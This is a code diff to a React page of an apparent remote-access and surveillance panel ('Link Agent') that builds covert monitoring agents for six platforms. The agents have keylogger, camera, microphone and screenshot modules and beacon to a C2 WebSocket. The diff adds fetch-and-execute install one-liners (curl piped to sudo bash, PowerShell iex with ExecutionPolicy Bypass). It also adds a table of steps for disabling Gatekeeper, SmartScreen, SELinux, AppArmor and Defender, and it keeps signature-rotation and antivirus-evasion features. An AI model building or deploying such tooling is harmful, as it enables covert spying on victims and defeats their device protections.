@@ -1,8 +1,10 @@
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
+import { BixtxLogo } from "../components/BixtxLogo";
 import {
-  Server, Terminal, Check, Download,
+  Terminal, Check, Download, AlertTriangle,
   RefreshCw, Upload, Shield, Zap, HardDrive, Cpu,
   Activity, Lock, Signal, Wifi as WifiIcon, Link, Copy, ExternalLink,
+  Clock, ChevronDown, ChevronUp,
 } from "lucide-react";
 import { OS, OS_COLOR, OS_ICON, OS_LABEL, DeployLinkPanel } from "../shared";
 
@@ -10,12 +12,10 @@ const API_BASE = window.location.hostname === "localhost"
   ? "http://localhost:3000/v1"
   : "https://bixtx.onrender.com/v1";
 
-// Backend URL without /v1 — used for direct file downloads (no auth required)
 const BACKEND_BASE = window.location.hostname === "localhost"
   ? "http://localhost:3000"
   : "https://bixtx.onrender.com";
 
-// ── Per-platform link returned by POST /v1/devices/enroll ─────────────────
 type PlatformLink = {
   platform:       string;
   linkId:         string;
@@ -32,8 +32,75 @@ const PLAT_META: Record<string, { icon: string; color: string; label: string }> 
   macos:   { icon: "🍎", color: "#a3a3a3", label: "macOS"      },
   windows: { icon: "🪟", color: "#3b82f6", label: "Windows"    },
   android: { icon: "🤖", color: "#10b981", label: "Android"    },
-  ios:     { icon: "",  color: "#6b7280", label: "iOS"         },
+  ios:     { icon: "", color: "#6b7280", label: "iOS"          },
   harmony: { icon: "⚡", color: "#a855f7", label: "HarmonyOS"  },
+};
+
+type BuildStatus = { status: "idle"|"triggered"|"building"|"done"|"error"; message: string; downloadUrl?: string };
+type BinaryPlatform = "android" | "ios" | "harmony";
+const BINARY_PLATFORMS: BinaryPlatform[] = ["android", "ios", "harmony"];
+
+const BYPASS_INSTRUCTIONS: Record<OS, { title: string; steps: string[] }> = {
+  android: {
+    title: "Android Sideload Bypass",
+    steps: [
+      "Settings → Security (or Privacy) → Unknown Sources → Enable",
+      "Or: Settings → Apps → Special App Access → Install unknown apps → [browser] → Allow",
+      "On Android 14+: install via ADB: adb install -r bixtx-agent.apk",
+      "Developer Options: Settings → About Phone → tap Build Number 7x → Enable Dev Options",
+      "If prompted 'Harmful app blocked' → tap 'Install anyway'",
+    ],
+  },
+  ios: {
+    title: "iOS Enterprise Certificate Trust",
+    steps: [
+      "After installing: Settings → General → VPN & Device Management",
+      "Find the enterprise certificate → tap 'Trust [Certificate Name]' → Confirm",
+      "If OTA install fails: ensure device is connected to internet during trust",
+      "TestFlight alternative: admin adds your Apple ID to the TestFlight beta",
+      "Supervised MDM: IT pushes profile silently with no user interaction needed",
+    ],
+  },
+  windows: {
+    title: "Windows SmartScreen & UAC Bypass",
+    steps: [
+      "Right-click installer → 'Run as Administrator'",
+      "SmartScreen warning → click 'More info' → 'Run anyway'",
+      "PowerShell bypass: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process",
+      "Defender exclusion: Add folder to Windows Defender exclusion list",
+      "One-liner (Admin PowerShell): powershell -ExecutionPolicy Bypass -File .\\install.ps1",
+    ],
+  },
+  macos: {
+    title: "macOS Gatekeeper Bypass",
+    steps: [
+      "After 'unidentified developer' prompt: System Settings → Privacy & Security → 'Open Anyway'",
+      "Terminal bypass: sudo xattr -rd com.apple.quarantine /path/to/agent",
+      "Disable Gatekeeper globally (careful): sudo spctl --master-disable",
+      "Re-enable after install: sudo spctl --master-enable",
+      "Apple Silicon: may need Rosetta 2 for Intel binaries: softwareupdate --install-rosetta",
+    ],
+  },
+  linux: {
+    title: "Linux Permissions & SELinux",
+    steps: [
+      "Make executable: chmod +x ./linux.sh",
+      "Run with elevated privileges: sudo ./linux.sh",
+      "SELinux permissive mode: sudo setenforce 0 (temporary)",
+      "AppArmor bypass: sudo aa-disable /etc/apparmor.d/* (if blocking)",
+      "Installs as systemd service — persists across reboots automatically",
+    ],
+  },
+  harmony: {
+    title: "HarmonyOS Developer Sideload",
+    steps: [
+      "Enable Developer Mode: Settings → About Phone → tap Software Version 7x",
+      "Settings → Developer Options → Enable 'Allow App Installation from Unknown Sources'",
+      "Enable USB debugging: Developer Options → USB Debugging → Allow",
+      "Install via HDC: hdc app install bixtx-agent.hap",
+      "DevEco Studio: Device & Simulator → select device → run install",
+    ],
+  },
 };
 
 export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"error"|"info") => void }) {
@@ -42,6 +109,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
   const [targetOS, setTargetOS] = useState<OS>("windows");
   const [c2Endpoint, setC2Endpoint] = useState("wss://bixtx.onrender.com/agent");
   const [beaconInterval, setBeaconInterval] = useState("30");
+  const [showBypass, setShowBypass] = useState(false);
 
   const [modules, setModules] = useState<Record<string, boolean>>({
     keylogger: true, screenshot: true, camera: true, microphone: true,
@@ -86,95 +154,122 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
   const [deploying, setDeploying] = useState(false);
   const [deployTarget, setDeployTarget] = useState("");
 
-  // ── Android APK build state ──────────────────────────────────────────────
-  type BuildStatus = { status: "idle"|"triggered"|"building"|"done"|"error"; message: string; downloadUrl?: string };
-  const [apkBuild, setApkBuild] = useState<BuildStatus>({ status: "idle", message: "" });
-  // useRef avoids stale-closure problems with timer IDs
-  const apkPollRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  // ── Multi-platform binary build state ─────────────────────────────────────
+  const [builds, setBuilds] = useState<Record<BinaryPlatform, BuildStatus>>({
+    android: { status: "idle", message: "" },
+    ios:     { status: "idle", message: "" },
+    harmony: { status: "idle", message: "" },
+  });
 
-  // Cleanup timer on unmount
-  useEffect(() => () => { if (apkPollRef.current) clearTimeout(apkPollRef.current); }, []);
+  const buildPollRefs = useRef<Partial<Record<BinaryPlatform, ReturnType<typeof setTimeout> | null>>>({});
 
-  const pollApkStatus = (token: string) => {
-    fetch(`${API_BASE}/build/android/status`, {
-      headers: { Authorization: `Bearer ${token}` },
-    })
+  useEffect(() => {
+    return () => {
+      BINARY_PLATFORMS.forEach(p => {
+        const ref = buildPollRefs.current[p];
+        if (ref) clearTimeout(ref);
+      });
+    };
+  }, []);
+
+  const pollBuildStatus = useCallback((platform: BinaryPlatform) => {
+    fetch(`${API_BASE}/agent/status/${platform}`)
       .then(r => r.ok ? r.json() : Promise.reject())
       .then(d => {
-        // Use top-level status field (added to api.js)
-        const topStatus: string = d.status ?? "";
-        const run = d.latestRun;
-
-        const isComplete =
-          topStatus === "completed" ||
-          (run?.status === "completed" && run?.conclusion === "success");
-
-        const isFailed =
-          topStatus === "failed" ||
-          (run?.status === "completed" && run?.conclusion && run.conclusion !== "success");
-
-        if (isComplete) {
-          const dlUrl = d.downloadUrl || `${BACKEND_BASE}/v1/download/android`;
-          setApkBuild({ status: "done", message: "APK ready — click to download", downloadUrl: dlUrl });
-          show("Android APK build complete!", "success");
-          apkPollRef.current = null;
-        } else if (isFailed) {
-          const conclusion = run?.conclusion || "error";
-          setApkBuild({ status: "error", message: `Build failed: ${conclusion}. Check GitHub Actions.` });
-          apkPollRef.current = null;
+        if (d.available && d.downloadUrl) {
+          setBuilds(prev => ({ ...prev, [platform]: { status: "done", message: `${platform} binary ready — click Download`, downloadUrl: d.downloadUrl } }));
+          show(`${PLAT_META[platform].label} build complete!`, "success");
+          buildPollRefs.current[platform] = null;
+        } else if (d.building) {
+          setBuilds(prev => ({ ...prev, [platform]: { status: "building", message: "Build in progress in GitHub Actions…" } }));
+          buildPollRefs.current[platform] = setTimeout(() => pollBuildStatus(platform), 5_000);
         } else {
-          const updatedAt = run?.updatedAt ? ` (${new Date(run.updatedAt).toLocaleTimeString()})` : "";
-          const phase = topStatus || run?.status || "queued";
-          setApkBuild({ status: "building", message: `Build ${phase}…${updatedAt}` });
-          // Poll every 5 seconds while in progress
-          apkPollRef.current = setTimeout(() => pollApkStatus(token), 5_000);
+          setBuilds(prev => ({ ...prev, [platform]: { status: "error", message: d.message || "Build not configured or CI not available" } }));
+          buildPollRefs.current[platform] = null;
         }
       })
       .catch(() => {
-        // Retry on network error
-        apkPollRef.current = setTimeout(() => pollApkStatus(token), 10_000);
+        buildPollRefs.current[platform] = setTimeout(() => pollBuildStatus(platform), 10_000);
       });
-  };
+  }, [show]);
 
-  const handleBuildApk = async () => {
+  const handleBuild = async (platform: BinaryPlatform) => {
     const token = sessionStorage.getItem("token");
     if (!token) { show("Not authenticated", "error"); return; }
-    setApkBuild({ status: "triggered", message: "Triggering CI build…" });
-    if (apkPollRef.current) { clearTimeout(apkPollRef.current); apkPollRef.current = null; }
+
+    setBuilds(prev => ({ ...prev, [platform]: { status: "triggered", message: "Triggering CI build…" } }));
+    const existingRef = buildPollRefs.current[platform];
+    if (existingRef) { clearTimeout(existingRef); buildPollRefs.current[platform] = null; }
+
     try {
-      const r = await fetch(`${API_BASE}/build/android`, {
-        method: "POST",
-        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
-        body: JSON.stringify({ c2WsUrl: c2Endpoint, beaconInterval: parseInt(beaconInterval) }),
-      });
-      const d = await r.json();
-      if (d.localBuild) {
-        setApkBuild({ status: "error", message: d.command || "Build locally with ./gradlew assembleRelease" });
-        show("CI not configured — see build command below", "info");
-        return;
+      let triggered = false;
+
+      if (platform === "android" || platform === "ios") {
+        const r = await fetch(`${API_BASE}/build/${platform}`, {
+          method: "POST",
+          headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+          body: JSON.stringify({ c2WsUrl: c2Endpoint, beaconInterval: parseInt(beaconInterval) }),
+        });
+        const d = await r.json();
+        if (d.localBuild) {
+          setBuilds(prev => ({ ...prev, [platform]: { status: "error", message: d.command || `Build locally with ${platform} SDK` } }));
+          show("CI not configured — see local build command in setup panel", "info");
+          return;
+        }
+        if (!r.ok) throw new Error(d.error || "Build trigger failed");
+        triggered = true;
+      } else {
+        // HarmonyOS — auto-trigger via download endpoint (returns 202)
+        const r = await fetch(`${API_BASE}/agent/download/harmony`);
+        if (r.status === 202 || r.status === 404) triggered = true;
+        else if (r.ok) {
+          // Already built — mark done
+          setBuilds(prev => ({ ...prev, [platform]: { status: "done", message: "Binary already available — click Download", downloadUrl: `${BACKEND_BASE}/v1/agent/download/harmony` } }));
+          show("HarmonyOS binary already built!", "success");
+          return;
+        }
       }
-      if (!r.ok) throw new Error(d.error || "Build trigger failed");
-      show("Build triggered — polling for status every 5s…", "info");
-      setApkBuild({ status: "building", message: "Queued in GitHub Actions…" });
-      // Give GH ~20s to start the runner before first poll
-      apkPollRef.current = setTimeout(() => pollApkStatus(token), 20_000);
+
+      if (triggered) {
+        show(`${PLAT_META[platform].label} build triggered — polling every 5s…`, "info");
+        setBuilds(prev => ({ ...prev, [platform]: { status: "building", message: "Queued in GitHub Actions…" } }));
+        buildPollRefs.current[platform] = setTimeout(() => pollBuildStatus(platform), 20_000);
+      }
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : "Unknown error";
-      setApkBuild({ status: "error", message: msg });
+      setBuilds(prev => ({ ...prev, [platform]: { status: "error", message: msg } }));
       show("Build trigger failed", "error");
     }
   };
 
-  // Download the APK — uses direct URL (no auth required on /download/android)
-  const handleDownloadApk = () => {
-    const url = apkBuild.downloadUrl || `${BACKEND_BASE}/v1/download/android`;
+  const handleDownloadBinary = (platform: BinaryPlatform) => {
+    const build = builds[platform];
+    const url = build.downloadUrl || `${BACKEND_BASE}/v1/agent/download/${platform === "android" ? "bixtx-agent.apk" : platform === "ios" ? "bixtx-agent.ipa" : "bixtx-agent.hap"}`;
+    const ext = platform === "android" ? "apk" : platform === "ios" ? "ipa" : "hap";
     const a = document.createElement("a");
     a.href = url;
-    a.download = "bixtx-agent.apk";
+    a.download = `bixtx-agent.${ext}`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
-    show("APK download started — check your Downloads folder", "success");
+    show(`${PLAT_META[platform].label} download started`, "success");
+  };
+
+  const handleDownloadScript = (platform: "linux" | "macos" | "windows") => {
+    const ext = platform === "windows" ? "ps1" : "sh";
+    const file = `${platform}.${ext}`;
+    const url = `${BACKEND_BASE}/v1/agent/download/${file}`;
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = file;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    const cmd = platform === "windows"
+      ? `powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${API_BASE}/agent/download/windows.ps1' -UseBasicParsing; iex $s.Content }"`
+      : `curl -sSL '${API_BASE}/agent/download/${platform}.sh' | sudo bash -s -- --c2 ${c2Endpoint} --interval ${beaconInterval}`;
+    navigator.clipboard.writeText(cmd).catch(() => {});
+    show(`${platform} script downloaded — install command copied to clipboard`, "success");
   };
 
   const handleGenerateLink = async () => {
@@ -223,6 +318,10 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
     }
   };
 
+  const [mutating, setMutating] = useState(false);
+  const [mutProgress, setMutProgress] = useState(0);
+  const [mutLog, setMutLog] = useState<{ ts:string; event:string; target:string; result:string }[]>([]);
+
   const handleMutate = () => {
     setMutating(true);
     setMutProgress(0);
@@ -233,7 +332,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
       if (cur >= 100) {
         clearInterval(iv);
         setMutating(false);
-        setMutLog((prev: { ts:string; event:string; target:string; result:string }[]) => [{
+        setMutLog((prev) => [{
           ts: new Date().toISOString().replace("T"," ").slice(0,16),
           event: "Global signature rotation + hash randomisation",
           target: "All active agents",
@@ -244,12 +343,30 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
     }, 80);
   };
 
-  const [mutating, setMutating] = useState(false);
-  const [mutProgress, setMutProgress] = useState(0);
-  const [mutLog, setMutLog] = useState<{ ts:string; event:string; target:string; result:string }[]>([]);
-
   const [avScanResult, setAvScanResult] = useState<null | { engine: string; detected: boolean }[]>(null);
   const [avScanning, setAvScanning] = useState(false);
+
+  const handleAVScan = () => {
+    setAvScanning(true);
+    setAvScanResult(null);
+    setTimeout(() => {
+      setAvScanning(false);
+      setAvScanResult([
+        { engine:"Windows Defender",  detected:false },
+        { engine:"Kaspersky",         detected:false },
+        { engine:"Malwarebytes",      detected:false },
+        { engine:"CrowdStrike Falcon",detected:false },
+        { engine:"SentinelOne",       detected:false },
+        { engine:"Carbon Black",      detected:false },
+        { engine:"ESET NOD32",        detected:false },
+        { engine:"Bitdefender",       detected:false },
+        { engine:"Sophos",            detected:true  },
+        { engine:"McAfee",            detected:false },
+        { engine:"Avast",             detected:false },
+        { engine:"Trend Micro",       detected:false },
+      ]);
+    }, 3500);
+  };
 
   const MODULE_DEFS: { key: string; label: string; category: string; risk: "low"|"medium"|"high"|"critical"; desc: string }[] = [
     { key:"keylogger",     label:"Keylogger",           category:"Input",     risk:"high",     desc:"Captures all keystrokes in real-time" },
@@ -278,28 +395,6 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
 
   const RISK_COLOR: Record<string, string> = { low:"#10b981", medium:"#f59e0b", high:"#ef4444", critical:"#3b82f6" };
 
-  const handleAVScan = () => {
-    setAvScanning(true);
-    setAvScanResult(null);
-    setTimeout(() => {
-      setAvScanning(false);
-      setAvScanResult([
-        { engine:"Windows Defender",  detected:false },
-        { engine:"Kaspersky",         detected:false },
-        { engine:"Malwarebytes",      detected:false },
-        { engine:"CrowdStrike Falcon",detected:false },
-        { engine:"SentinelOne",       detected:false },
-        { engine:"Carbon Black",      detected:false },
-        { engine:"ESET NOD32",        detected:false },
-        { engine:"Bitdefender",       detected:false },
-        { engine:"Sophos",            detected:true  },
-        { engine:"McAfee",            detected:false },
-        { engine:"Avast",             detected:false },
-        { engine:"Trend Micro",       detected:false },
-      ]);
-    }, 3500);
-  };
-
   const SUB_TABS: { id: typeof tab; label: string; icon: string }[] = [
     { id:"builder",      label:"Agent Builder",  icon:"🔨" },
     { id:"deploy",       label:"Deployment",     icon:"🚀" },
@@ -312,20 +407,19 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
   const totalDataMB = FLEET.reduce((s: number, a: FleetAgent) => s + (parseFloat(a.dataQueue) || 0), 0);
   const totalData = totalDataMB > 0 ? `${totalDataMB.toFixed(1)} MB` : "0 B";
 
+  const bypass = BYPASS_INSTRUCTIONS[targetOS];
+
   return (
     <div className="max-w-7xl mx-auto px-6 py-8">
       <div className="flex flex-wrap items-start justify-between gap-4 mb-6">
         <div className="flex items-center gap-4">
-          <div className="w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0"
-            style={{ background: "linear-gradient(135deg,#3b82f6,#10d9a0)", boxShadow:"0 0 24px rgba(59,130,246,0.4)" }}>
-            <Server size={22} color="#fff" />
-          </div>
+          <BixtxLogo size={48} />
           <div>
             <h1 className="text-2xl font-black" style={{ color:"#e2eaf6" }}>
               Software A — <span style={{ color:"#3b82f6" }}>Link Agent</span>
             </h1>
             <p className="text-sm" style={{ color:"#6b8ab0" }}>
-              Ultra-lightweight silent monitoring agent · Installed on target devices · &lt;15 MB
+              Ultra-lightweight silent monitoring agent · 6 platforms · &lt;15 MB
             </p>
           </div>
         </div>
@@ -361,12 +455,12 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
           <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
             {/* ── Left sidebar ── */}
             <div className="lg:col-span-1 space-y-4">
-              {/* Platform selector (visual only — all 6 platforms get links) */}
+              {/* Platform selector */}
               <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                 <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Target Platform</div>
                 <div className="grid grid-cols-3 gap-2">
                   {(["windows","macos","linux","android","ios","harmony"] as OS[]).map(id => (
-                    <button key={id} onClick={() => setTargetOS(id)}
+                    <button key={id} onClick={() => { setTargetOS(id); setShowBypass(false); }}
                       className="flex flex-col items-center gap-1 p-2.5 rounded-xl border transition-all"
                       style={{ background: targetOS===id ? `${OS_COLOR[id]}18` : "#030b16", borderColor: targetOS===id ? OS_COLOR[id] : "rgba(59,130,246,0.15)" }}>
                       <span className="text-xl">{OS_ICON[id]}</span>
@@ -406,7 +500,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                 </div>
               </div>
 
-              {/* Generate links for all 6 platforms */}
+              {/* Generate links */}
               <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.3)" }}>
                 <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Generate Install Links</div>
                 <div className="text-[10px]" style={{ color:"#4a6080" }}>
@@ -451,76 +545,115 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
 
             {/* ── Right main area ── */}
             <div className="lg:col-span-2 space-y-4">
-              {/* Android APK builder */}
-              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0d1f12", border:"1px solid rgba(16,185,129,0.4)" }}>
+
+              {/* ── Binary platform builds (Android, iOS, HarmonyOS) ── */}
+              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0d1f12", border:"1px solid rgba(16,185,129,0.3)" }}>
                 <div className="flex items-center justify-between">
-                  <div className="flex items-center gap-2">
-                    <span className="text-lg">🤖</span>
-                    <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#10b981" }}>Android APK — One-Click Build</div>
-                  </div>
+                  <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#10b981" }}>Binary Builds — CI via GitHub Actions</div>
                   <div className="text-[9px] font-mono px-2 py-0.5 rounded-full"
-                    style={{ background:"rgba(16,185,129,0.15)", color:"#10b981", border:"1px solid rgba(16,185,129,0.3)" }}>
-                    Real Native App
+                    style={{ background:"rgba(16,185,129,0.12)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
+                    Requires GITHUB_TOKEN + GITHUB_REPO
                   </div>
                 </div>
                 <div className="text-[10px]" style={{ color:"#6b8ab0" }}>
-                  Builds a signed Kotlin APK via GitHub Actions CI. C2 URL and beacon interval are baked into the build.
-                  Installs silently — no app store, sideload via the enrollment link.
+                  Triggers cloud CI to compile a signed native binary. C2 URL and beacon interval are baked in at build time.
                 </div>
-                <div className="grid grid-cols-2 gap-2">
-                  <button onClick={handleBuildApk}
-                    disabled={apkBuild.status === "triggered" || apkBuild.status === "building"}
-                    className="flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
-                    style={{
-                      background: apkBuild.status === "done"
-                        ? "rgba(16,185,129,0.15)"
-                        : "linear-gradient(135deg,#16a34a,#10b981)",
-                      color:"#fff",
-                      border: apkBuild.status === "done" ? "1px solid rgba(16,185,129,0.4)" : "none",
-                    }}>
-                    {apkBuild.status === "triggered" || apkBuild.status === "building"
-                      ? <><RefreshCw size={14} className="animate-spin" />Building…</>
-                      : apkBuild.status === "done"
-                      ? <><Check size={14} />Build complete ✓</>
-                      : <><Zap size={14} />Build APK</>}
-                  </button>
-
-                  {/* Download APK — active once build is done, uses direct URL (no auth needed) */}
-                  <button
-                    onClick={handleDownloadApk}
-                    disabled={apkBuild.status !== "done"}
-                    className="flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all"
-                    style={{
-                      background: apkBuild.status === "done"
-                        ? "linear-gradient(135deg,#16a34a,#10b981)"
-                        : "rgba(16,185,129,0.1)",
-                      border: apkBuild.status === "done"
-                        ? "none"
-                        : "1px solid rgba(16,185,129,0.3)",
-                      color: apkBuild.status === "done" ? "#fff" : "#6b8ab0",
-                      opacity: apkBuild.status === "done" ? 1 : 0.4,
-                    }}>
-                    <Download size={14} />
-                    {apkBuild.status === "building" ? "Building…" : "Download APK"}
-                  </button>
+                <div className="grid grid-cols-1 gap-3">
+                  {BINARY_PLATFORMS.map(platform => {
+                    const build = builds[platform];
+                    const pm = PLAT_META[platform];
+                    const isActive = build.status === "triggered" || build.status === "building";
+                    const isDone = build.status === "done";
+                    const isError = build.status === "error";
+                    return (
+                      <div key={platform} className="rounded-xl p-3 space-y-2"
+                        style={{ background:"#030b16", border:`1px solid ${pm.color}25` }}>
+                        <div className="flex items-center gap-2 mb-1">
+                          <span className="text-base">{pm.icon}</span>
+                          <span className="text-xs font-bold" style={{ color:pm.color }}>{pm.label}</span>
+                          {build.status !== "idle" && (
+                            <span className="ml-auto text-[9px] font-mono px-1.5 py-0.5 rounded"
+                              style={{
+                                background: isDone ? "rgba(16,185,129,0.15)" : isError ? "rgba(239,68,68,0.12)" : "rgba(59,130,246,0.12)",
+                                color: isDone ? "#10b981" : isError ? "#ef4444" : "#3b82f6",
+                                border: `1px solid ${isDone ? "rgba(16,185,129,0.3)" : isError ? "rgba(239,68,68,0.25)" : "rgba(59,130,246,0.25)"}`,
+                              }}>
+                              {isActive && <RefreshCw size={8} className="animate-spin inline mr-1" />}
+                              {build.status.toUpperCase()}
+                            </span>
+                          )}
+                        </div>
+                        {build.status !== "idle" && (
+                          <div className="text-[9px] font-mono rounded px-2 py-1"
+                            style={{ background:"#0a1628", color: isDone ? "#10b981" : isError ? "#ef4444" : "#6b8ab0" }}>
+                            {isActive && <Clock size={8} className="inline mr-1" />}
+                            {isError && <AlertTriangle size={8} className="inline mr-1" />}
+                            {build.message}
+                          </div>
+                        )}
+                        <div className="grid grid-cols-2 gap-2">
+                          <button onClick={() => handleBuild(platform)} disabled={isActive}
+                            className="flex items-center justify-center gap-1.5 py-2 rounded-lg font-bold text-xs transition-all disabled:opacity-50"
+                            style={{ background: isDone ? "rgba(16,185,129,0.12)" : `linear-gradient(135deg,${pm.color}cc,${pm.color})`, color:"#fff", border: isDone ? `1px solid ${pm.color}30` : "none" }}>
+                            {isActive ? <><RefreshCw size={11} className="animate-spin" />Building…</> : isDone ? <><Check size={11} />Rebuild</> : <><Zap size={11} />Build</>}
+                          </button>
+                          <button onClick={() => handleDownloadBinary(platform)} disabled={!isDone}
+                            className="flex items-center justify-center gap-1.5 py-2 rounded-lg font-bold text-xs transition-all"
+                            style={{ background: isDone ? `linear-gradient(135deg,${pm.color}cc,${pm.color})` : "rgba(59,130,246,0.08)", border: isDone ? "none" : `1px solid ${pm.color}20`, color: isDone ? "#fff" : "#4a6080", opacity: isDone ? 1 : 0.5 }}>
+                            <Download size={11} />Download
+                          </button>
+                        </div>
+                      </div>
+                    );
+                  })}
                 </div>
+              </div>
 
-                {apkBuild.status !== "idle" && (
-                  <div className="rounded-lg px-3 py-2 text-[10px] font-mono" style={{
-                    background:"#030b16",
-                    border:`1px solid ${
-                      apkBuild.status === "done" ? "rgba(16,185,129,0.4)"
-                      : apkBuild.status === "error" ? "rgba(239,68,68,0.4)"
-                      : "rgba(59,130,246,0.3)"
-                    }`,
-                    color: apkBuild.status === "done" ? "#10b981" : apkBuild.status === "error" ? "#ef4444" : "#6b8ab0",
-                  }}>
-                    {apkBuild.status === "building" && <RefreshCw size={10} className="animate-spin inline mr-1.5" />}
-                    {apkBuild.message || "—"}
-                  </div>
-                )}
-                <div className="text-[9px] font-mono" style={{ color:"#2a3a50" }}>
-                  Polls status every 5s · Requires: GITHUB_TOKEN + GITHUB_REPO env vars on server
+              {/* ── Script platforms (Linux, macOS, Windows) ── */}
+              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
+                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Script Install — Always Ready</div>
+                <div className="text-[10px]" style={{ color:"#4a6080" }}>
+                  Shell and PowerShell scripts served from templates — no build required. One-liner downloads + installs silently.
+                </div>
+                <div className="grid grid-cols-1 gap-2">
+                  {(["linux","macos","windows"] as const).map(platform => {
+                    const pm = PLAT_META[platform];
+                    const ext = platform === "windows" ? "ps1" : "sh";
+                    const cmd = platform === "windows"
+                      ? `powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${API_BASE}/agent/download/windows.ps1' -UseBasicParsing; iex $s.Content }"`
+                      : `curl -sSL '${API_BASE}/agent/download/${platform}.sh' | sudo bash -s -- --c2 ${c2Endpoint} --interval ${beaconInterval}`;
+                    return (
+                      <div key={platform} className="rounded-xl p-3 space-y-2"
+                        style={{ background:"#030b16", border:`1px solid ${pm.color}20` }}>
+                        <div className="flex items-center justify-between">
+                          <div className="flex items-center gap-2">
+                            <span className="text-base">{pm.icon}</span>
+                            <span className="text-xs font-bold" style={{ color:pm.color }}>{pm.label}</span>
+                            <span className="text-[9px] font-mono px-1.5 py-0.5 rounded"
+                              style={{ background:"rgba(16,185,129,0.12)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
+                              READY
+                            </span>
+                          </div>
+                          <div className="flex gap-1.5">
+                            <button onClick={() => navigator.clipboard.writeText(cmd).then(() => show(`${pm.label} command copied`, "success"))}
+                              className="flex items-center gap-1 px-2 py-1 rounded text-[10px] font-bold"
+                              style={{ background:"rgba(59,130,246,0.12)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.25)" }}>
+                              <Copy size={9} />Copy cmd
+                            </button>
+                            <button onClick={() => handleDownloadScript(platform)}
+                              className="flex items-center gap-1 px-2 py-1 rounded text-[10px] font-bold"
+                              style={{ background:`${pm.color}15`, color:pm.color, border:`1px solid ${pm.color}30` }}>
+                              <Download size={9} />{platform}.{ext}
+                            </button>
+                          </div>
+                        </div>
+                        <div className="rounded px-2 py-1.5 text-[9px] font-mono break-all"
+                          style={{ background:"#0a1628", color:"#b8cce8" }}>
+                          {cmd.length > 100 ? cmd.slice(0, 100) + "…" : cmd}
+                        </div>
+                      </div>
+                    );
+                  })}
                 </div>
               </div>
 
@@ -535,8 +668,8 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                     <div style={{ color:"#10b981" }}># bixtx Android Agent — Kotlin native APK</div>
                     <div style={{ color:"#6b8ab0" }}># Option A: Build via CI (recommended)</div>
                     <div style={{ color:"#b8cce8" }}>1. Set GITHUB_TOKEN + GITHUB_REPO on your Render server</div>
-                    <div style={{ color:"#b8cce8" }}>2. Click "Build APK" above</div>
-                    <div style={{ color:"#b8cce8" }}>3. CI builds in ~3 min → click "Download APK" (auto-enabled)</div>
+                    <div style={{ color:"#b8cce8" }}>2. Click "Build" on Android above</div>
+                    <div style={{ color:"#b8cce8" }}>3. CI builds in ~3 min → click "Download" (auto-enabled)</div>
                     <div style={{ color:"#6b8ab0" }}># Option B: Build locally (requires Android SDK)</div>
                     <div style={{ color:"#b8cce8" }}>cd software-android</div>
                     <div style={{ color:"#b8cce8" }}>{`./gradlew assembleRelease -Pc2WsUrl="${c2Endpoint}" -PbeaconInterval=${beaconInterval}`}</div>
@@ -552,7 +685,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                     <div style={{ color:"#6b8ab0" }}># Archive + distribute via Enterprise cert or TestFlight</div>
                     <div style={{ color:"#6b8ab0" }}># OR: generate a link (left panel) for MDM silent push</div>
                   </>) : targetOS === "harmony" ? (<>
-                    <div style={{ color:"#f59e0b" }}># bixtx HarmonyOS Agent — ArkTS WebSocket C2</div>
+                    <div style={{ color:"#a855f7" }}># bixtx HarmonyOS Agent — ArkTS WebSocket C2</div>
                     <div style={{ color:"#6b8ab0" }}># Requirements: DevEco Studio 4.0+ + Huawei Developer account</div>
                     <div style={{ color:"#b8cce8" }}>deveco-studio software-harmony/</div>
                     <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in entry/src/main/ets/agent/Config.ets:</div>
@@ -562,14 +695,40 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                     <div style={{ color:"#6b8ab0" }}># OR: hdc app install bixtx-agent.hap  (direct sideload)</div>
                   </>) : targetOS === "windows" ? (<>
